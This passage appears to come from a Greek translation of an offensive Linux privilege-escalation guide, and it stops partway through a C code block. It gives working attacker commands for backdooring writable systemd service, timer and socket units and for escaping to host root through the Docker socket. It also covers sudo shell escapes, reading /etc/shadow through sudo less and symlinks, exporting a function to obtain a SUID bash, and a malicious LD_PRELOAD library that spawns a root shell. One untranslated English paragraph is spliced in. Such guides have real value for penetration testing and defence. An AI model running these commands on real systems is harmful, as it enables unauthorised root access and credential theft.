### Εγγράψιμα αρχεία _.service_

Ελέγξτε αν μπορείτε να εγγράψετε οποιοδήποτε αρχείο `.service`, αν μπορείτε, μπορείτε να το **τροποποιήσετε** ώστε να **εκτελεί** την **πίσω πόρτα** σας όταν η υπηρεσία **ξεκινά**, **επανεκκινείται** ή **διακόπτεται** (ίσως χρειαστεί να περιμένετε μέχρι να επανεκκινηθεί η μηχανή).\
Για παράδειγμα, δημιουργήστε την πίσω πόρτα σας μέσα στο αρχείο .service με την εντολή **`ExecStart=/tmp/script.sh`**

### Εγγράψιμες δυαδικές υπηρεσίες

Θυμηθείτε ότι αν έχετε **δικαιώματα εγγραφής σε δυαδικά που εκτελούνται από υπηρεσίες**, μπορείτε να τα αλλάξετε για πίσω πόρτες, έτσι ώστε όταν οι υπηρεσίες εκτελούνται ξανά, οι πίσω πόρτες θα εκτελεστούν.

### Κατάλογος PATH του systemd - Σχετικές διαδρομές

Μπορείτε να δείτε τον PATH που χρησιμοποιείται από το **systemd** με την εντολή:
```bash
systemctl show-environment
```
Εάν διαπιστώσετε ότι μπορείτε να **εγγράψετε** σε οποιονδήποτε από τους φακέλους της διαδρομής, μπορεί να είστε σε θέση να **αναβαθμίσετε τα δικαιώματα**. Πρέπει να αναζητήσετε αρχεία **διαμορφώσεων υπηρεσιών** που χρησιμοποιούν **σχετικές διαδρομές**, όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Στη συνέχεια, δημιουργήστε ένα **εκτελέσιμο** με το **ίδιο όνομα με το δυαδικό αρχείο της σχετικής διαδρομής** μέσα στον φάκελο PATH του systemd που μπορείτε να γράψετε, και όταν ζητηθεί από την υπηρεσία να εκτελέσει την ευπάθεια ενέργεια (**Έναρξη**, **Διακοπή**, **Επαναφόρτωση**), θα εκτελεστεί η **παρασκηνιακή πόρτα** σας (συνήθως οι μη προνομιούχοι χρήστες δεν μπορούν να ξεκινήσουν/διακόψουν υπηρεσίες, αλλά ελέγξτε αν μπορείτε να χρησιμοποιήσετε `sudo -l`).

**Μάθετε περισσότερα για τις υπηρεσίες με την εντολή `man systemd.service`.**

## **Χρονοδιακτυρές**

Οι **χρονοδιακτυρές** είναι αρχεία μονάδας του systemd των οποίων το όνομα τελειώνει σε `**.timer**` και ελέγχουν αρχεία υπηρεσίας (`**.service**`) ή γεγονότα. Οι **χρονοδιακτυρές** μπορούν να χρησιμοποιηθούν ως εναλλακτική λύση για το cron καθώς έχουν ενσωματωμένη υποστήριξη για γεγονότα ημερολογίου και γεγονότα μονοτονικού χρόνου και μπορούν να εκτελούνται ασύγχρονα.

Μπορείτε να απαριθμήσετε όλες τις χρονοδιακτυρές με:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι χρονοδιακόπτες

Εάν μπορείτε να τροποποιήσετε ένα χρονοδιακόπτη, μπορείτε να τον καταστήσετε να εκτελέσει ορισμένες υπάρχουσες μονάδες του systemd (όπως ένα `.service` ή ένα `.target`)
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι η μονάδα (Unit):

> Η μονάδα που ενεργοποιείται όταν αυτός ο χρονοδιακόπτης λήξει. Το όρισμα είναι το όνομα μιας μονάδας, η οποία δεν έχει κατάληξη ".timer". Αν δεν καθοριστεί, αυτή η τιμή προεπιλέγεται σε μια υπηρεσία που έχει το ίδιο όνομα με τη μονάδα του χρονοδιακόπτη, εκτός από την κατάληξη. (Βλέπε παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της μονάδας του χρονοδιακόπτη να έχουν το ίδιο όνομα, εκτός από την κατάληξη.

Επομένως, για να καταχραστείτε αυτήν την άδεια θα χρειαστείτε:

* Να βρείτε μια μονάδα systemd (όπως ένα `.service`) που **εκτελεί ένα εγγράψιμο δυαδικό αρχείο**
* Να βρείτε μια μονάδα systemd που **εκτελεί ένα σχετικό μονοπάτι** και να έχετε **εγγράψιμα δικαιώματα** πάνω στο **σύστημα PATH του systemd** (για να προσομοιώσετε αυτό το εκτελέσιμο)

**Μάθετε περισσότερα για τους χρονοδιακόπτες με την εντολή `man systemd.timer`.**

### **Ενεργοποίηση του χρονοδιακόπτη**

Για να ενεργοποιήσετε έναν χρονοδιακόπτη, χρειάζεστε δικαιώματα ριζού και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι ο **χρονοδιακόπτης** ενεργοποιείται δημιουργώντας ένα symlink σε αυτόν στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Σοκέτες

Οι Unix Domain Sockets (UDS) επιτρέπουν την **επικοινωνία διεργασιών** στον ίδιο ή διαφορετικό υπολογιστή μέσα σε μοντέλα πελάτη-εξυπηρετητή. Χρησιμοποιούν τα πρότυπα αρχεία περιγραφέων Unix για τη διασύνδεση υπολογιστών και δημιουργούνται μέσω αρχείων `.socket`.

Οι σοκέτες μπορούν να διαμορφωθούν χρησιμοποιώντας αρχεία `.socket`.

**Μάθετε περισσότερα για τις σοκέτες με την εντολή `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να διαμορφωθούν αρκετές ενδιαφέρουσες παράμετροι:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές είναι διαφορετικές, αλλά μια περίληψη χρησιμοποιείται για να **υποδείξει πού θα ακούει** η σοκέτα (η διαδρομή του αρχείου AF\_UNIX socket, ο αριθμός IPv4/6 και/ή θύρα για ακρόαση, κλπ.)
* `Accept`: Παίρνει ένα λογικό όρισμα. Εάν είναι **αληθές**, δημιουργείται μια **περίπτωση υπηρεσίας για κάθε εισερχόμενη σύνδεση** και μόνο η συνδεσμολογία περνιέται σε αυτήν. Εάν είναι **ψευδές**, όλες οι ακροάσεις σοκέτας αυτές καθαυτές **περνιούνται στην εκκινούμενη μονάδα υπηρεσίας**, και δημιουργείται μόνο μια μονάδα υπηρεσίας για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για σοκέτες διαγράμματος και FIFO όπου μια μόνο μονάδα υπηρεσίας χειρίζεται απόλυτα όλη την εισερχόμενη κίνηση. **Προεπιλογή είναι το ψευδές**. Για λόγους απόδοσης, συνιστάται να γράφετε νέους δαίμονες μόνο με τρόπο που είναι κατάλληλος για το `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Παίρνει μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν από** ή **μετά από** τη δημιουργία και τη σύνδεση των ακροάσεων **σοκέτας**/FIFO, αντίστοιχα. Το πρώτο τεκμήριο της γραμμής εντολής πρέπει να είναι ένα απόλυτο όνομα αρχείου, ακολουθούμενο από τα ορίσματα για τη διεργασία.
* `ExecStopPre`, `ExecStopPost`: Επιπλέον **εντολές** που **εκτελούνται πριν από** ή **μετά από** το κλείσιμο και την αφαίρεση των ακροάσεων **σοκέτας**/FIFO, αντίστοιχα.
* `Service`: Καθορίζει το όνομα της **μονάδας υπηρεσίας προς ενεργοποίηση** για την **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για σοκέτες με Accept=no. Προεπιλογή είναι η υπηρεσία που φέρει το ίδιο όνομα με τη σοκέτα (με την αντικατάσταση του επιθήματος). Στις περισσότερες περιπτώσεις, δεν θα είναι απαραίτητο να χρησιμοποιήσετε αυτήν την επιλογή.

### Εγγράψιμα αρχεία .socket

Εάν βρείτε ένα **εγγράψιμο** αρχείο `.socket`, μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι όπως: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί η σοκέτα. Επομένως, θα **πρέπει πιθανότατα να περιμένετε μέχρι να επανεκκινηθεί η μηχανή**.\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί αυτήν τη διαμόρφωση του αρχείου σοκέτας, αλλιώς το backdoor δεν θα εκτελεστεί_

### Εγγράψιμες σοκέτες

Εάν **ανιχνεύσετε οποιαδήποτε εγγράψιμη σοκέτα** (_τώρα μιλάμε για Unix Sockets και όχι για τα αρχεία διαμόρφωσης `.socket`_), τότε **μπορείτε να επικοινωνήσετε** με αυτήν τη σοκέτα και ίσως να εκμεταλλευτείτε μια ευπάθεια.

### Απαρίθμηση Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση

To establish a raw connection, you can use tools like `netcat` or `nc` to connect to a specific IP address and port. This allows you to communicate directly with the target system without any protocol or encryption.

To connect to a remote system using `netcat`, use the following command:

```bash
nc <IP address> <port>
```

Replace `<IP address>` with the target system's IP address and `<port>` with the desired port number.

Once the connection is established, you can send and receive data through the terminal. This can be useful for various purposes, including debugging network issues, testing network services, or even exploiting vulnerabilities.

Keep in mind that raw connections do not provide any security or encryption. Therefore, it is important to use them responsibly and only in controlled environments.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Παράδειγμα εκμετάλλευσης:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν κάποια **sockets που ακούνε για HTTP** αιτήσεις (_δεν αναφέρομαι σε αρχεία .socket αλλά σε αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με την εντολή:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Εάν το socket απαντά με ένα αίτημα HTTP, τότε μπορείτε να επικοινωνήσετε μαζί του και ίσως να εκμεταλλευτείτε κάποια ευπάθεια.

### Εγγράψιμο Docker Socket

Το Docker socket, που συνήθως βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να προστατευθεί. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε ανέλιξη προνομιακών δικαιωμάτων. Παρακάτω παρουσιάζεται μια ανάλυση του πώς μπορεί να γίνει αυτό και εναλλακτικές μέθοδοι εάν δεν είναι διαθέσιμο το Docker CLI.

#### **Ανέλιξη Προνομιακών Δικαιωμάτων με το Docker CLI**

Εάν έχετε εγγραφή στο Docker socket, μπορείτε να αναβαθμίσετε τα δικαιώματα χρησιμοποιώντας τις παρακάτω εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Αυτές οι εντολές σας επιτρέπουν να εκτελέσετε ένα container με πρόσβαση σε επίπεδο root στο αρχείο συστήματος του host.

#### **Χρήση του Docker API Απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί να χειριστεί ακόμα χρησιμοποιώντας το Docker API και εντολές `curl`.

1. **Λίστα εικόνων Docker:**
Ανακτήστε τη λίστα των διαθέσιμων εικόνων.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Δημιουργία ενός Container:**
Αποστείλετε ένα αίτημα για τη δημιουργία ενός container που συνδέει το ριζικό κατάλογο του συστήματος του host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Ξεκινήστε το νεοδημιουργημένο container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Σύνδεση στο Container:**
Χρησιμοποιήστε το `socat` για να εγκαθιδρύσετε μια σύνδεση με το container, επιτρέποντας την εκτέλεση εντολών μέσα σε αυτό.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Μετά την εγκαθίδρυση της σύνδεσης `socat`, μπορείτε να εκτελέσετε εντολές απευθείας στο container με πρόσβαση σε επίπεδο root στο αρχείο συστήματος του host.

### Άλλα

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο docker socket επειδή είστε **μέλος της ομάδας `docker`** έχετε [**περισσότερους τρόπους ανέλιξης προνομίων**](interesting-groups-linux-pe/#docker-group). Αν η [**docker API ακούει σε ένα θύρα** μπορείτε επίσης να την εκμεταλλευτείτε](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Ελέγξτε **περισσότερους τρόπους να ξεφύγετε από το docker ή να το καταχραστείτε για να αναβαθμίσετε τα προνόμια** στο:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Ανέλιξη προνομίων Containerd (ctr)

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`**, διαβάστε την παρακάτω σελίδα καθώς **μπορείτε να την καταχραστείτε για να αναβαθμίσετε τα προνόμια**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Ανέλιξη προνομίων **RunC**

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`**, διαβάστε την παρακάτω σελίδα καθώς **μπορείτε να την καταχραστείτε για να αναβαθμίσετε τα προνόμια**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

Το D-Bus είναι ένα εξελιγμένο σύστημα **επικοινωνίας μεταξύ διεργασιών (IPC)** που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα αποτελεσματικά. Σχεδιασμένο με το σύγχρονο σύστημα Linux στο μυαλό, προσφέρει ένα αξιόπιστο πλαίσιο για διάφορες μορφές επικοινωνίας εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασική IPC που βελτιώνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, όπως οι βελτιωμένες UNIX domain sockets. Επιπλέον, βοηθά στη μετάδοση γεγονότων ή σημάτων, προωθώντας την ομαλή ενσωμάτωση μεταξύ συστατικών του συστήματος. Για παράδειγμα, ένα σήμα από έναν δαίμονα Bluetooth για μια εισερχόμενη κλήση μπορεί να προκαλέσει τον σίγαση ενός αναπαραγωγέα μουσικής, βελτιώνοντας την εμπειρία του χρήστη. Επιπλέον, το D-Bus υποστηρίζει ένα απομακρυσμένο σύστημα αντικειμένων, απλοποιώντας τα αιτήματα υπηρεσιών και τις κλήσεις μεθόδων μεταξύ εφαρμογών, επιταχύνοντας διαδικασίες που ήταν παραδοσιακά πολύπλοκες.

Το D-Bus λειτουργεί με βάση ένα μοντέλο **επιτροπής/απαγόρευσης**, διαχειρίζοντας τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων κλπ) με βάση τη συνολική επίδραση των αντίστοιχων κανόνων πολιτικής. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το δίαυλο, ενδεχομένως επιτρέποντας την ανέλιξη προνομίων μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Παρέχεται ένα παράδειγμα μιας τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, που περιγράφει τα δικαιώματα για τον χρήστη root να κατέχει, να στέλνει και να λαμβάνει μηνύματα από το `fi.w1.wpa_supplicant1`.

Οι πολιτικές χωρίς καθορισμένο χρήστη ή ομάδα ισχύουν καθολικά, ενώ οι πολιτικές περιβάλλοντος "default" ισχύουν
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθετε πώς να απαριθμήσετε και να εκμεταλλευτείτε μια επικοινωνία D-Bus εδώ:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να απαριθμήσετε το δίκτυο και να καταλάβετε τη θέση της μηχανής.

### Γενική απαρίθμηση
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ανοιχτές θύρες

Πάντα ελέγχετε τις δικτυακές υπηρεσίες που εκτελούνται στο μηχάνημα που δεν μπορούσατε να αλληλεπιδράσετε μαζί του πριν από την πρόσβασή σας:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Καταγραφή δεδομένων

Ελέγξτε αν μπορείτε να καταγράψετε την κίνηση των δεδομένων. Αν μπορείτε, μπορείτε να αποκτήσετε πρόσβαση σε ορισμένα διαπιστευτήρια.
```
timeout 1 tcpdump
```
## Χρήστες

### Γενική Απαρίθμηση

Ελέγξτε **ποιος** είστε, ποια **δικαιώματα** έχετε, ποιοι **χρήστες** υπάρχουν στο σύστημα, ποιοι μπορούν να **συνδεθούν** και ποιοι έχουν **δικαιώματα root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Μεγάλο UID

Ορισμένες εκδόσεις του Linux επηρεάστηκαν από ένα σφάλμα που επιτρέπει σε χρήστες με **UID > INT\_MAX** να αναβαθμίσουν τα δικαιώματά τους. Περισσότερες πληροφορίες: [εδώ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [εδώ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [εδώ](https://twitter.com/paragonsec/status/1071152249529884674).\
**Εκμεταλλευτείτε το** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που μπορεί να σας παραχωρήσει δικαιώματα root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Πρόχειρο

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον μέσα στο πρόχειρο (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών Πρόσβασης

Η πολιτική κωδικών πρόσβασης είναι ένα σημαντικό μέτρο ασφαλείας που πρέπει να εφαρμόζεται σε ένα σύστημα για να προστατεύονται οι λογαριασμοί των χρηστών. Η πολιτική αυτή ορίζει τις απαιτήσεις για τους κωδικούς πρόσβασης, περιλαμβάνοντας το μήκος, την πολυπλοκότητα και την περίοδο αλλαγής τους.

Οι παρακάτω συστάσεις μπορούν να εφαρμοστούν για μια αποτελεσματική πολιτική κωδικών πρόσβασης:

- Ορίστε ένα ελάχιστο μήκος κωδικού πρόσβασης που να είναι αρκετά μεγάλο για να δυσκολεύει την εύρεση του από επιτιθέμενους.
- Απαιτήστε τη χρήση σύνθετων κωδικών που να περιλαμβάνουν γράμματα (κεφαλαία και πεζά), αριθμούς και ειδικούς χαρακτήρες.
- Ενθαρρύνετε τους χρήστες να μην χρησιμοποιούν εύκολα μαντεύσιμους κωδικούς, όπως τα προσωπικά τους στοιχεία ή απλές ακολουθίες.
- Απαιτήστε την αλλαγή του κωδικού πρόσβασης σε τακτά χρονικά διαστήματα, προκειμένου να αποτρέπεται η μακροχρόνια χρήση του ίδιου κωδικού.
- Εφαρμόστε μηχανισμούς κλειδώματος λογαριασμού μετά από πολλαπλές αποτυχημένες προσπάθειες σύνδεσης, προκειμένου να αποτραπεί η επίθεση με χρήση λεξικού ή brute force.

Η εφαρμογή μιας ισχυρής πολιτικής κωδικών πρόσβασης μπορεί να βοηθήσει στην προστασία του συστήματος από επιθέσεις προσπέλασης με ανόμοια διαπίστευση.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί πρόσβασης

Εάν **γνωρίζετε οποιονδήποτε κωδικό πρόσβασης** του περιβάλλοντος, **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον κωδικό πρόσβασης.

### Su Brute

Εάν δεν σας πειράζει να προκαλέσετε πολύ θόρυβο και οι δυαδικοί `su` και `timeout` είναι παρόντες στον υπολογιστή, μπορείτε να δοκιμάσετε να κάνετε brute-force στον χρήστη χρησιμοποιώντας το [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
Το [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` επίσης προσπαθεί να κάνει brute-force στους χρήστες.

## Κατάχρηση εγγράψιμων PATH

### $PATH

Εάν διαπιστώσετε ότι μπορείτε να **εγγράψετε μέσα σε κάποιον φάκελο του $PATH**, μπορείτε να αναβαθμίσετε τα δικαιώματα δημιουργώντας μια πίσω πόρτα μέσα στον εγγράψιμο φάκελο με το όνομα μιας εντολής που θα εκτελεστεί από διαφορετικό χρήστη (ιδανικά root) και που **δεν φορτώνεται από έναν φάκελο που βρίσκεται προηγούμενος** στον $PATH του εγγράψιμου φακέλου.

### SUDO και SUID

Μπορείτε να επιτρέπεστε να εκτελέσετε μια εντολή χρησιμοποιώντας το sudo ή μπορεί να έχουν το suid bit. Ελέγξτε το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Ορισμένες **απρόσμενες εντολές σας επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμα και να εκτελέσετε μια εντολή**. Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η διαμόρφωση του Sudo μπορεί να επιτρέψει σε έναν χρήστη να εκτελέσει μια εντολή με τα δικαιώματα ενός άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα, ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`, είναι τώρα εύκολο να αποκτήσετε ένα κέλυφος προσθέτοντας ένα κλειδί ssh στον κατάλογο του ρίζα ή καλώντας το `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση κάποιας ενέργειας:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στη μηχανή HTB Admirer**, ήταν **ευάλωτο** στο **PYTHONPATH hijacking** για να φορτώσει μια αυθαίρετη βιβλιοθήκη Python κατά την εκτέλεση του σεναρίου ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Παράκαμψη εκτέλεσης Sudo μέσω διαδρομών

**Μετάβαση** για να διαβάσετε άλλα αρχεία ή χρησιμοποιήστε **συμβολικά συνδέσμους**. Για παράδειγμα στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Εάν χρησιμοποιηθεί ένας **wildcard** (\*), τότε είναι ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Μέτρα προστασίας**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Εντολή Sudo/SUID δυαδικό χωρίς διαδρομή εντολής

Εάν η **άδεια sudo** δίνεται σε μια μόνο εντολή **χωρίς να καθορίζεται η διαδρομή**: _hacker10 ALL= (root) less_, μπορείτε να το εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί εάν ένα **suid** δυαδικό αρχείο εκτελεί ένα άλλο πρόγραμμα χωρίς να καθορίζει τη διαδρομή του (πάντα ελέγξτε με την εντολή **_strings_** το περιεχόμενο ενός παράξενου suid δυαδικού αρχείου).

[Παραδείγματα φορτίων για εκτέλεση.](payloads-to-execute.md)

### SUID δυαδικό αρχείο με διαδρομή εντολής

Εάν το **suid** δυαδικό αρχείο εκτελεί ένα άλλο πρόγραμμα καθορίζοντας τη διαδρομή του, τότε μπορείτε να δοκιμάσετε να **εξάγετε μια συνάρτηση** με το όνομα της εντολής που καλεί το suid αρχείο.

Για παράδειγμα, εάν ένα suid δυαδικό αρχείο καλεί το _**/usr/sbin/service apache2 start**_, πρέπει να δοκιμάσετε να δημιουργήσετε τη συνάρτηση και να την εξάγετε:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Στη συνέχεια, όταν καλείτε το suid δυαδικό, αυτή η συνάρτηση θα εκτελεστεί

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει ένα ή περισσότερες κοινόχρηστες βιβλιοθήκες (.so αρχεία) που θα φορτωθούν από τον φορτωτή πριν από όλες τις άλλες, συμπεριλαμβανομένης της τυπικής C βιβλιοθήκης (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως προ-φόρτωση βιβλιοθήκης.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η εκμετάλλευση αυτής της δυνατότητας, ιδιαίτερα με εκτελέσιμα αρχεία **suid/sgid**, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο φορτωτής αγνοεί το **LD_PRELOAD** για εκτελέσιμα αρχεία όπου ο πραγματικός αναγνωριστικός χρήστης (_ruid_) δεν ταιριάζει με το αποτέλεσμα του αναγνωριστικού χρήστη (_euid_).
- Για εκτελέσιμα αρχεία με suid/sgid, φορτώνονται μόνο βιβλιοθήκες σε τυπικά μονοπάτια που είναι επίσης suid/sgid.

Η ανέλιξη προνομιακών δικαιωμάτων μπορεί να συμβεί εάν έχετε τη δυνατότητα να εκτελέσετε εντολές με την εντολή `sudo` και το αποτέλεσμα της `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει την διατήρηση και αναγνώριση της μεταβλητής περιβάλλοντος **LD_PRELOAD** ακόμα και όταν εκτελούνται εντολές με την `sudo`, με δυνητική εκτέλεση κώδικα με αυξημένα προνόμια.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθήκευση ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια, **μεταγλωττίστε το** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τελικά, **αναβαθμίστε τα δικαιώματα** εκτελώντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Μια παρόμοια προώθηση προνομίων μπορεί να καταχραστεί αν ο επιτιθέμενος ελέγχει τη μεταβλητή περιβάλλοντος **LD\_LIBRARY\_PATH** επειδή ελέγχει τη διαδρομή όπου θα αναζητηθούν οι βιβλιοθήκες.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

